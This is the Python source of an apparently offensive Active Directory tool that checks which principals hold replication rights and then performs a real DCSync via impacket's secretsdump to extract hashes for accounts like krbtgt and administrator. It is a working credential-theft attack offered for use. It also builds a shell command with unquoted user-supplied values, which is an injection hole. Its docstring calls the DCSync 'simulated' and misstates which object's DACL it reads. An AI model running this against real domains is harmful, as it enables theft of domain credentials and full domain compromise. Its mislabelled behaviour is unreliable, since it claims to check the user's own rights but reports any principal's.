#!/usr/bin/env python3
"""
redshift_toolkit.ad.dcsync_check — Check whether the current user has
DCSync rights, and (optionally) execute a simulated DCSync.

DCSync mechanics
----------------
The DRSUAPI RPC interface (specifically DRSGetNCChanges, opnum 3) is the
mechanism domain controllers use to replicate directory partitions among
themselves. Any principal with the extended rights:

    DS-Replication-Get-Changes        (1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
    DS-Replication-Get-Changes-All    (1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)

can request replication — including secrets — from the DC.

This tool has two modes:

  --check-only    Only inspects the DACL of the domain object's adminSDHolder
                  and reports who has the two extended rights.

  --target USER   Actually performs the DCSync against the target user(s).
                  Implementation is delegated to impacket.examples.secretsdump.

Usage
-----
  # Read-only check
  python3 -m redshift_toolkit.ad.dcsync_check \\
      --dc dc01.lab.local --user alice -p Password1 \\
      --domain lab.local --check-only

  # Targeted DCSync (requires DCSync rights)
  python3 -m redshift_toolkit.ad.dcsync_check \\
      --dc dc01.lab.local --user alice -p Password1 \\
      --domain lab.local --target krbtgt --target administrator

Requires
--------
  pip install ldap3 impacket

Author: Redshift Project — Module 18
License: MIT
"""

from __future__ import annotations

import argparse
import json
import sys
from dataclasses import asdict, dataclass, field

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
GREY = "\033[90m"
BOLD = "\033[1m"
RESET = "\033[0m"


def paint(s: str, c: str, on: bool) -> str:
    return f"{c}{s}{RESET}" if on else s


REPLICATION_RIGHTS = {
    "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2": "DS-Replication-Get-Changes",
    "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2": "DS-Replication-Get-Changes-All",
    "89e95b76-444d-4c62-991a-0facbeda640c": "DS-Replication-Get-Changes-In-Filtered-Set",
}


@dataclass
class DCSyncCheck:
    has_dcsync: bool = False
    principals_with_rights: list[dict] = field(default_factory=list)
    errors: list[str] = field(default_factory=list)


def check_dcsync_rights(dc: str, user: str, password: str, domain: str) -> DCSyncCheck:
    """Read DACL of domain root object; report principals with replication rights."""
    try:
        from ldap3 import ALL, NTLM, Connection, Server, MODIFY_REPLACE
        from ldap3.protocol.microsoft import security_descriptor_control
    except ImportError:
        sys.stderr.write("error: pip install ldap3\n")
        sys.exit(2)

    base_dn = ",".join(f"DC={p}" for p in domain.split("."))
    s = Server(dc, get_info=ALL)
    c = Connection(s, user=f"{domain}\\{user}", password=password,
                   authentication=NTLM, auto_bind=True)
    controls = security_descriptor_control(sdflags=0x07)  # owner+group+DACL
    c.search(base_dn, "(objectClass=*)", search_scope="BASE",
             attributes=["nTSecurityDescriptor"], controls=controls)

    result = DCSyncCheck()
    if not c.entries:
        result.errors.append("could not read nTSecurityDescriptor")
        c.unbind()
        return result

    raw = c.entries[0]["nTSecurityDescriptor"].raw_values[0]
    # Parse using impacket's SR_SECURITY_DESCRIPTOR
    try:
        from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR
    except ImportError:
        sys.stderr.write("error: pip install impacket\n")
        sys.exit(2)
    sd = SR_SECURITY_DESCRIPTOR()
    sd.fromString(raw)

    principals: dict[str, set[str]] = {}
    for ace in sd["Dacl"].aces:
        if ace["AceType"] not in (0x05,):  # ACCESS_ALLOWED_OBJECT_ACE_TYPE
            continue
        try:
            obj_type = ace["Ace"]["ObjectType"].hex().lower()
            # ldaptypes returns ObjectType as raw bytes; build GUID string
            guid = "-".join([
                bytes.fromhex(obj_type[0:8])[::-1].hex(),
                bytes.fromhex(obj_type[8:12])[::-1].hex(),
                bytes.fromhex(obj_type[12:16])[::-1].hex(),
                obj_type[16:20],
                obj_type[20:32],
            ])
        except Exception:
            continue
        if guid not in REPLICATION_RIGHTS:
            continue
        try:
            sid = ace["Ace"]["Sid"].formatCanonical()
        except Exception:
            sid = "<unknown>"
        principals.setdefault(sid, set()).add(REPLICATION_RIGHTS[guid])

    for sid, rights in principals.items():
        result.principals_with_rights.append({"sid": sid, "rights": sorted(rights)})

    # We have DCSync if a SID we control has both Get-Changes AND Get-Changes-All
    for sid, rights in principals.items():
        if "DS-Replication-Get-Changes" in rights and "DS-Replication-Get-Changes-All" in rights:
            result.has_dcsync = True
            break

    c.unbind()
    return result


def perform_dcsync(dc: str, user: str, password: str, domain: str, targets: list[str]):
    """Run impacket secretsdump --just-dc-user TARGET. We shell out rather than reimplement."""
    import subprocess
    import shlex

    out = []
    for target in targets:
        cmd = (f"secretsdump.py -dc-ip {dc} -just-dc-user {target} "
               f"{domain}/{user}:{shlex.quote(password)}@{dc}")
        try:
            res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=120)
            out.append({"target": target, "stdout": res.stdout, "stderr": res.stderr,
                        "returncode": res.returncode})
        except Exception as e:
            out.append({"target": target, "error": str(e)})
    return out


def main():
    p = argparse.ArgumentParser(
        prog="dcsync_check",
        description="Check / perform DCSync against an Active Directory domain.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    p.add_argument("--dc", required=True, help="Domain controller")
    p.add_argument("--user", required=True, help="Authenticated domain user")
    p.add_argument("-p", "--password", required=True, help="Password")
    p.add_argument("--domain", required=True, help="Domain")
    p.add_argument("--check-only", action="store_true", help="Only check DACL; do not replicate")
    p.add_argument("--target", action="append", default=[],
                   help="Target user(s) to DCSync (e.g. krbtgt). May be repeated.")
    p.add_argument("--format", choices=("text", "json"), default="text")
    p.add_argument("--no-color", action="store_true")
    args = p.parse_args()

    on = sys.stdout.isatty() and not args.no_color

    if not args.check_only and not args.target:
        args.check_only = True  # default to safe check

    check = check_dcsync_rights(args.dc, args.user, args.password, args.domain)

    if args.format == "json":
        out = {"check": asdict(check)}
        if not args.check_only and args.target:
            out["dcsync_results"] = perform_dcsync(args.dc, args.user, args.password,
                                                   args.domain, args.target)
        print(json.dumps(out, indent=2))
        return

    print(paint(f"\n[+] DCSync DACL check on {args.domain}", BOLD, on))
    if check.has_dcsync:
        print(paint("    [!] One or more principals have BOTH replication rights — DCSync available",
                    RED, on))
    for entry in check.principals_with_rights:
        rights_str = ", ".join(entry["rights"])
        print(f"    SID: {entry['sid']:50s} {rights_str}")

    if check.errors:
        for e in check.errors:
            print(paint(f"    [!] {e}", RED, on))

    if not args.check_only and args.target:
        print(paint(f"\n[+] Performing DCSync against {len(args.target)} target(s)...", YELLOW, on))
        results = perform_dcsync(args.dc, args.user, args.password, args.domain, args.target)
        for r in results:
            print(f"\n[+] Target: {r.get('target')}")
            if r.get("returncode") == 0:
                print(r.get("stdout", ""))
            else:
                print(paint(r.get("stderr") or r.get("error") or "(no output)", RED, on))


if __name__ == "__main__":
    main()
